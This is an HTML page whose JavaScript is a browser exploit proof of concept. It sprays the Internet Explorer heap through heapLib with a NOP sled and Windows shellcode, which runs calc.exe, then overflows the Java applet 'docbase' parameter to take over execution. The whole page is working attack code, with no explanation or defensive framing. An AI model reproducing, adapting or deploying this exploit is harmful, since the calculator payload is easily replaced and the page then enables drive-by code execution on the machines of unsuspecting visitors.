<html>
<head>
   <link rel="shortcut icon" href="http://127.0.0.1:9999/x.ico" />
   <script src="heaplib.js"></script>

   <script>
   function packv(n) {
      var s = new Number(n).toString(16);
      while(s.length < 8) s = "0" + s;
      return(unescape("%u" + s.substring(4,8) + "%u" + s.substring(0,4)));
   }

   function spray_heap() {
      heap = new heapLib.ie(0x20000);

      var payload, block1, nopsled1; //if it is 314bytes + 2 = 316 bytes 4 bytes alignments. calc.exe 200 bytes
    
      payload = unescape("%ue8fc%u0089%u0000%u8960%u31e5%u64d2%u528b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%uc031%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf0e2%u5752%u528b%u8b10%u3c42%ud001%u408b%u8578%u74c0%u014a%u50d0%u488b%u8b18%u2058%ud301%u3ce3%u8b49%u8b34%ud601%uff31%uc031%uc1ac%u0dcf%uc701%ue038%uf475%u7d03%u3bf8%u247d%ue275%u8b58%u2458%ud301%u8b66%u4b0c%u588b%u011c%u8bd3%u8b04%ud001%u4489%u2424%u5b5b%u5961%u515a%ue0ff%u5f58%u8b5a%ueb12%u5d86%u016a%u858d%u00b9%u0000%u6850%u8b31%u876f%ud5ff%uf0bb%ua2b5%u6856%u95a6%u9dbd%ud5ff%u063c%u0a7c%ufb80%u75e0%ubb05%u1347%u6f72%u006a%uff53%u63d5%u6c61%u2e63%u7865%u0065");

      block1 = unescape("%u9090%u9090");

      // build nopsled1
      nopsled1 = payload;
      while(nopsled1.length < 0x1000)
         nopsled1 += block1;

      var heapblock1 = nopsled1;

      while(heapblock1.length < 0x40000)
         heapblock1 += heapblock1;

      var trimmedblock1 = heapblock1.substring(2, 0x40000 - 0x21);

      // heap spray
      for(var i = 0 ; i < 800 ; i++)
         heap.alloc(trimmedblock1);
   }

   function trigger() {
      var buf = "";

      for(i = 0; i < 200; i++)
         buf += unescape("%08%08%08%08"); //change to anywhere you want (little-endian)

      var htmlTags =
         "<object type='application/x-java-applet'>" +
         "<param name='launchjnlp' value='1'>" +
         "<param name='docbase' value='" + buf + "'>" +
         "</object>";

      document.write(htmlTags);
   }
   </script>
</head>
<body onload="spray_heap()">
   <input type="button" value="Click Me" onclick="trigger()">
</body>
</html>
